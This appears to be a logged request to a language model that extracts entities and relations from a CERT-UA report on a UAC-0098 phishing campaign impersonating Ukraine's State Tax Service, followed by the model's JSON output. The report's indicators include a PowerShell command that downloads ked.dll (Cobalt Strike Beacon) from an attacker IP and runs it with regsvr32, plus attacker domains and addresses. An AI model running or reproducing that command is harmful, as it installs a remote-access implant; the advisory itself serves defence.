@@ -1,0 +1,218 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Виявлено шкідливий документ "Накладення штрафних санкцій.docx" відкриття якого призведе до завантаження HTML-файлу та виконання JavaScript-коду (CVE-2022-30190), який забезпечить завантаження та запуск шкідливої програми Cobalt Strike Beacon (дата компіляції: 16.06.2022).</p><p>У взаємодії з суб'єктом координації з'ясовано, що згаданий DOCX-документ містився в захищеному паролем архіві "НакладенняШтрафнихСанкцiй.zip", який, в свою чергу, розповсюджувався засобами електронної пошти, начебто, від імені "Державної податкової служби України" (тема листа: "Повідомлення про несплату податку").</p><p>Активність має персистентний характер та відстежується за ідентифікатором UAC-0098.&nbsp;</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">37c7b934661f31e526ffb31f7c935d5a&nbsp; &nbsp; 7d53782fab972b8b70c6c7134598da25fd125c58c88a6d468464cee6c9dbe764&nbsp; &nbsp; &nbsp; &nbsp; НакладенняШтрафнихСанкцiй.zip&nbsp;
+a3f3402656fc5be4439899b2a5f25eb6&nbsp; &nbsp; bc6898f0e66582ab92307809a409797749b49948fc265767579b224755b0a17b&nbsp; &nbsp; &nbsp; &nbsp; Накладення штрафних санкцій.docx
+85851e09b368ebba90f5d922cd77f348&nbsp; &nbsp; 02b77a482120b7997f06da67f33cdb286ab06b7ef1bd9dfb2ad77a634595abfe&nbsp; &nbsp; &nbsp; &nbsp; index.html
+52f371a4f06f3398a5a361335920618c&nbsp; &nbsp; 394cbab9eb87ef8ee795d184137ac2634b22a0a3e642534a55c1623a813c8a59&nbsp; &nbsp; &nbsp; &nbsp; ked.dll (Cobalt Strike Beacon)
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">rostyslav.nal0g@gmail[.]com
+hXXp://64[.]190.113.51:8000/index[.]html
+hXXp://5[.]199.173.152/ked[.]dll
+hXXps://baidenfree[.]com/jquery-3.3.1.min.js
+baidenfree[.]com
+golgba[.]com
+domtern[.]com
+jorgava[.]com
+185[.]143.223.29 (Received)
+64[.]190.113.51
+5[.]199.173.152
+5[.]199.174.219
+185[.]170.144.159
+87[.]251.64.5
+185[.]170.144.158
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">Invoke-WebRequest -Uri 'http://5.199.173.152/ked.dll' -OutFile 'c:\windows\tasks\ked.dll'; start-process regsvr32.exe -ArgumentList '/s C:\windows\tasks\ked.dll'
+C:\windows\tasks\ked.dll
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p><strong><span class="ql-cursor">﻿</span></strong></p>
+
+=== RESPONSE (13.6s, in 2031 / out 1700 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "Накладення штрафних санкцій.docx",
+      "kind": "malicious file",
+      "gloss": "A malicious Word document exploiting CVE-2022-30190 to deliver malware."
+    },
+    {
+      "name": "CVE-2022-30190",
+      "kind": "vulnerability identifier",
+      "gloss": "A remote code execution vulnerability in the Microsoft Windows Support Diagnostic Tool (MSDT), also known as Follina."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware family",
+      "gloss": "A post-exploitation agent and remote access tool frequently used in targeted attacks."
+    },
+    {
+      "name": "НакладенняШтрафнихСанкцiй.zip",
+      "kind": "malicious archive",
+      "gloss": "A password-protected ZIP archive used to deliver a malicious DOCX file via phishing emails."
+    },
+    {
+      "name": "Державної податкової служби України",
+      "kind": "government body",
+      "gloss": "The State Tax Service of Ukraine, a central executive body responsible for tax administration."
+    },
+    {
+      "name": "України",
+      "kind": "country",
+      "gloss": "A sovereign state in Eastern Europe."
+    },
+    {
+      "name": "UAC-0098",
+      "kind": "threat actor",
+      "gloss": "A persistent threat group known for cyberattacks against Ukrainian organizations."
+    },
+    {
+      "name": "index.html",
+      "kind": "malicious file",
+      "gloss": "A malicious HTML file containing JavaScript code used to download subsequent payloads."
+    },
+    {
+      "name": "ked.dll",
+      "kind": "malware file",
+      "gloss": "A dynamic link library file containing the Cobalt Strike Beacon payload."
+    },
+    {
+      "name": "rostyslav.nal0g@gmail.com",
+      "kind": "email address",
+      "gloss": "An email address used to distribute malicious phishing emails."
+    },
+    {
+      "name": "baidenfree.com",
+      "kind": "domain name",
+      "gloss": "A network domain name involved in the malicious campaign infrastructure."
+    },
+    {
+      "name": "golgba.com",
+      "kind": "domain name",
+      "gloss": "A network domain name used as malicious infrastructure."
+    },
+    {
+      "name": "domtern.com",
+      "kind": "domain name",
+      "gloss": "A network domain name associated with malicious activity."
+    },
+    {
+      "name": "jorgava.com",
+      "kind": "domain name",
+      "gloss": "A network domain name used as infrastructure in the attack."
+    },
+    {
+      "name": "64.190.113.51",
+      "kind": "ip address",
+      "gloss": "An IP address hosting malicious intermediate files."
+    },
+    {
+      "name": "5.199.173.152",
+      "kind": "ip address",
+      "gloss": "An IP address used to host and serve the Cobalt Strike Beacon payload."
+    },
+    {
+      "name": "5.199.174.219",
+      "kind": "ip address",
+      "gloss": "An IP address identified as part of the attacker infrastructure."
+    },
+    {
+      "name": "185.143.223.29",
+      "kind": "ip address",
+      "gloss": "An IP address associated with sending or receiving malicious email messages."
+    },
+    {
+      "name": "185.170.144.159",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious campaign infrastructure."
+    },
+    {
+      "name": "185.170.144.158",
+      "kind": "ip address",
+      "gloss": "An IP address involved in the attacker's network infrastructure."
+    },
+    {
+      "name": "87.251.64.5",
+      "kind": "ip address",
+      "gloss": "An IP address identified as an indicator of compromise."
+    }
+  ],
+  "relations": [
+    {
+      "head": "НакладенняШтрафнихСанкцiй.zip",
+      "type": "contains-file",
+      "tail": "Накладення штрафних санкцій.docx",
+      "evidence": "DOCX-документ містився в захищеному паролем архіві \"НакладенняШтрафнихСанкцiй.zip\""
+    },
+    {
+      "head": "Накладення штрафних санкцій.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2022-30190",
+      "evidence": "виконання JavaScript-коду (CVE-2022-30190)"
+    },
+    {
+      "head": "Накладення штрафних санкцій.docx",
+      "type": "downloads-file",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "забезпечить завантаження та запуск шкідливої програми Cobalt Strike Beacon"
+    },
+    {
+      "head": "UAC-0098",
+      "type": "impersonates-entity",
+      "tail": "Державної податкової служби України",
+      "evidence": "розповсюджувався засобами електронної пошти, начебто, від імені \"Державної податкової служби України\""
+    },
+    {
+      "head": "UAC-0098",
+      "type": "conducts-campaign",
+      "tail": "НакладенняШтрафнихСанкцiй.zip",
+      "evidence": "Активність має персистентний характер та відстежується за ідентифікатором UAC-0098"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "contains-file",
+      "definition": "Specifies that an archive or container file holds an internal file."
+    },
+    {
+      "name": "exploits-vulnerability",
+      "definition": "Indicates that a malicious file, script, or tool leverages a specific vulnerability."
+    },
+    {
+      "name": "downloads-file",
+      "definition": "Denotes that a file or script initiates the download of another file or payload."
+    },
+    {
+      "name": "impersonates-entity",
+      "definition": "Indicates that a threat actor poses as a legitimate organization or person to deceive targets."
+    },
+    {
+      "name": "conducts-campaign",
+      "definition": "Specifies that a threat actor is responsible for or deploys a particular malicious artifact or campaign."
+    }
+  ]
+}
